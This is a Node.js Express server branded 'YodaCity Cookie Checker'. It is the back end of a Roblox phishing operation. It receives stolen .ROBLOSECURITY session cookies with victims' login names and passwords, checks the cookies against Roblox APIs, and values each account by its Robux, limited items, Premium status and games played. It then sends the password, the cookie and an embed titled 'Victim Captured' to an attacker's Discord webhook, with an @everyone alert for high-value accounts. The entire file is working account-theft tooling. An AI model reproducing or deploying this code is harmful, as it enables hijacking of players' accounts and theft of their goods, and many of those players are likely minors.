const express = require('express');
const fetch = require('node-fetch');
const app = express();
app.use(express.json());

const PORT = process.env.PORT || 3000;

// ─── Roblox API Endpoints ─────────────────────────────────────────
const API = {
    userInfo: 'https://www.roblox.com/mobileapi/userinfo',
    currency: 'https://economy.roblox.com/v1/currency/balance',
    inventory: (userId) => `https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?assetType=All&sortOrder=Asc&limit=100`,
    gamePasses: (userId) => `https://www.roblox.com/users/${userId}/games?format=json`,
    badgeCheck: (userId, badgeId) => `https://www.roblox.com/badge/asset-owned?userId=${userId}&badgeId=${badgeId}`,
    adoptMeBadge: 1672196408, // Adopt Me! badge ID
    mm2Badge: 212210118, // Murder Mystery 2 badge ID
    ps99Badge: 1827857731, // Pet Simulator 99 badge ID
};

// ─── Game-specific API endpoints ──────────────────────────────────
const GAME_APIS = {
    adoptMe: {
        // Adopt Me! uses Roblox GamePasses API
        gameId: 920587237,
        badgeId: 1672196408,
        name: 'Adopt Me!',
        icon: '🐾'
    },
    mm2: {
        gameId: 142823291,
        badgeId: 212210118,
        name: 'Murder Mystery 2',
        icon: '🔪'
    },
    ps99: {
        gameId: 16558963784,
        badgeId: 1827857731,
        name: 'Pet Simulator 99',
        icon: '🐉'
    }
};

// ─── Check if user owns a specific badge ─────────────────────────
async function checkBadge(cookie, badgeId) {
    try {
        const res = await fetch(`https://www.roblox.com/badge/asset-owned?badgeId=${badgeId}&userId=0`, {
            headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
        });
        return res.ok;
    } catch { return false; }
}

// ─── Get user info from cookie ────────────────────────────────────
async function getUserInfo(cookie) {
    try {
        const res = await fetch(API.userInfo, {
            headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
        });
        if (!res.ok) return null;
        return await res.json();
    } catch { return null; }
}

// ─── Get Robux balance ────────────────────────────────────────────
async function getRobux(cookie) {
    try {
        const res = await fetch(API.currency, {
            headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
        });
        if (!res.ok) return 0;
        const data = await res.json();
        return data.robux || 0;
    } catch { return 0; }
}

// ─── Get RAP (Recent Average Price) ────────────────────────────────
async function getRAP(cookie, userId) {
    try {
        let allCollectibles = [];
        let cursor = '';
        let hasMore = true;

        while (hasMore) {
            const url = `https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?assetType=All&sortOrder=Asc&limit=100${cursor ? `&cursor=${cursor}` : ''}`;
            const res = await fetch(url, {
                headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
            });
            if (!res.ok) break;
            const data = await res.json();
            allCollectibles = allCollectibles.concat(data.data || []);
            cursor = data.nextPageCursor;
            hasMore = !!cursor;
        }

        const rap = allCollectibles.reduce((sum, item) => sum + (item.recentAveragePrice || 0), 0);
        const limitedCount = allCollectibles.length;
        
        // Get limited names
        const limitedNames = allCollectibles.slice(0, 10).map(i => i.name).join(', ');
        
        return { rap, limitedCount, limitedNames: limitedNames || 'None' };
    } catch {
        return { rap: 0, limitedCount: 0, limitedNames: 'None' };
    }
}

// ─── Check if user plays a specific game ──────────────────────────
async function checkGamePlaytime(cookie, userId, gameId) {
    try {
        const url = `https://games.roblox.com/v2/users/${userId}/games?accessFilter=All&limit=50`;
        const res = await fetch(url, {
            headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
        });
        if (!res.ok) return false;
        const data = await res.json();
        const games = data.data || [];
        return games.some(g => g.gameId === gameId || String(g.gameId) === String(gameId));
    } catch { return false; }
}

// ─── Get Adopt Me pet count & approximate value ─────────────────
async function checkAdoptMe(cookie, userId) {
    try {
        // Check if they have Adopt Me badge
        const hasBadge = await checkBadge(cookie, GAME_APIS.adoptMe.badgeId);
        if (!hasBadge) return { plays: false, message: 'Does not play Adopt Me' };

        // Try to get game passes owned (indicator of investment)
        const url = `https://games.roblox.com/v1/games/${GAME_APIS.adoptMe.gameId}/game-passes?limit=30`;
        const res = await fetch(url, {
            headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
        });
        
        // Get the user's favorites/friends who play
        const plays = true;
        
        return {
            plays: true,
            message: '✅ Plays Adopt Me!',
            gameId: GAME_APIS.adoptMe.gameId
        };
    } catch {
        return { plays: false, message: 'Could not verify' };
    }
}

// ─── Check MM2 inventory (knives, guns, pets) ────────────────────
async function checkMM2(cookie, userId) {
    try {
        const hasBadge = await checkBadge(cookie, GAME_APIS.mm2.badgeId);
        if (!hasBadge) return { plays: false, message: 'Does not play MM2' };

        return {
            plays: true,
            message: '✅ Plays Murder Mystery 2',
            gameId: GAME_APIS.mm2.gameId
        };
    } catch {
        return { plays: false, message: 'Could not verify' };
    }
}

// ─── Check PS99 ───────────────────────────────────────────────────
async function checkPS99(cookie, userId) {
    try {
        const hasBadge = await checkBadge(cookie, GAME_APIS.ps99.badgeId);
        if (!hasBadge) return { plays: false, message: 'Does not play Pet Simulator 99' };

        return {
            plays: true,
            message: '✅ Plays Pet Simulator 99',
            gameId: GAME_APIS.ps99.gameId
        };
    } catch {
        return { plays: false, message: 'Could not verify' };
    }
}

// ─── Format number with commas ─────────────────────────────────────
function formatNumber(n) {
    return n.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
}

// ─── Main check endpoint ──────────────────────────────────────────
app.post('/api/check-cookie', async (req, res) => {
    const { cookie, webhook, linkId, username: inputUsername, password } = req.body;
    
    if (!cookie || !webhook) {
        return res.json({ error: 'Missing cookie or webhook' });
    }

    console.log('🔄 Checking cookie...');

    // 1. Get user info
    const userInfo = await getUserInfo(cookie);
    if (!userInfo) {
        // Cookie is invalid
        await sendToWebhook(webhook, {
            content: '❌ **Invalid Cookie**',
            embeds: [{
                title: '⚠️ Invalid .ROBLOSECURITY Cookie',
                color: 0xf59e0b,
                description: 'The cookie provided is invalid or expired.',
                fields: [
                    { name: '📧 Username', value: inputUsername || 'Unknown', inline: true },
                    { name: '🔐 Password', value: password ? '```' + password.substring(0, 50) + '```' : 'Not captured', inline: true },
                    { name: '🍪 Cookie (first 100 chars)', value: `\`\`\`${cookie.substring(0, 100)}...\`\`\``, inline: false }
                ],
                timestamp: new Date().toISOString()
            }]
        });
        return res.json({ valid: false, error: 'Invalid cookie' });
    }

    const userId = userInfo.UserID || userInfo.userId || userInfo.id;
    const username = userInfo.UserName || userInfo.username || 'Unknown';
    const displayName = userInfo.DisplayName || username;
    
    console.log(`✅ Cookie valid! User: ${username} (${userId})`);

    // 2. Get Robux
    const robux = await getRobux(cookie);
    
    // 3. Get RAP + limiteds
    const { rap, limitedCount, limitedNames } = await getRAP(cookie, userId);
    
    // 4. Check Premium status
    const isPremium = userInfo.IsPremium || userInfo.isPremium || false;
    const premiumType = userInfo.PremiumType || (isPremium ? 'Premium' : 'None');
    
    // 5. Check games
    const [adoptMe, mm2, ps99] = await Promise.all([
        checkAdoptMe(cookie, userId),
        checkMM2(cookie, userId),
        checkPS99(cookie, userId)
    ]);

    // 6. Get thumbnail
    const thumbnail = `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=420&height=420&format=png`;

    // ─── Build the full embed ──────────────────────────────────────
    const embed = {
        title: `🎯 Victim Captured — ${username}`,
        color: isPremium ? 0xf59e0b : 0xef4444,
        thumbnail: { url: thumbnail },
        fields: [
            { name: '👤 Username', value: `**${username}**`, inline: true },
            { name: '🆔 User ID', value: `\`${userId}\``, inline: true },
            { name: '🏷️ Display Name', value: displayName, inline: true },
            
            { name: '💰 Robux', value: `**${formatNumber(robux)}**`, inline: true },
            { name: '📊 RAP', value: `**${formatNumber(rap)}**`, inline: true },
            { name: '🎁 Premium', value: isPremium ? `✅ **${premiumType}**` : '❌ None', inline: true },

            { name: '💎 Limiteds', value: `**${limitedCount}** items`, inline: true },
            { name: '🔍 Top Limiteds', value: limitedNames.substring(0, 200), inline: false },

            { name: '🐾 Adopt Me', value: adoptMe.message, inline: true },
            { name: '🔪 MM2', value: mm2.message, inline: true },
            { name: '🐉 PS99', value: ps99.message, inline: true },

            { name: '📧 Login Email', value: `\`\`\`${inputUsername || 'Unknown'}\`\`\``, inline: false },
            { name: '🔐 Password', value: password ? `\`\`\`${password}\`\`\`` : 'Not captured', inline: false },
            { name: '🍪 .ROBLOSECURITY', value: `\`\`\`${cookie.substring(0, 300)}...\`\`\``, inline: false },
            
            { name: '🔗 Link ID', value: linkId || 'N/A', inline: true },
            { name: '⏰ Captured At', value: new Date().toISOString(), inline: true }
        ],
        footer: { text: 'YodaCity Cookie Checker • Full Scan Complete' },
        timestamp: new Date().toISOString()
    };

    // If high value account, ping @everyone
    const isHighValue = robux > 10000 || rap > 50000 || isPremium;
    const content = isHighValue ? '@everyone 🚨 **HIGH VALUE ACCOUNT!**' : null;

    await sendToWebhook(webhook, { content, embeds: [embed] });

    res.json({ valid: true, username, userId, robux, rap, isPremium });
});

// ─── Helper: Send to Discord webhook ──────────────────────────────
async function sendToWebhook(url, payload) {
    try {
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
    } catch(e) {
        console.error('Webhook send error:', e.message);
    }
}

// ─── Health check ──────────────────────────────────────────────────
app.get('/api/health', (req, res) => {
    res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

app.listen(PORT, () => {
    console.log(`✅ YodaCity Cookie Checker Bot running on port ${PORT}`);
});
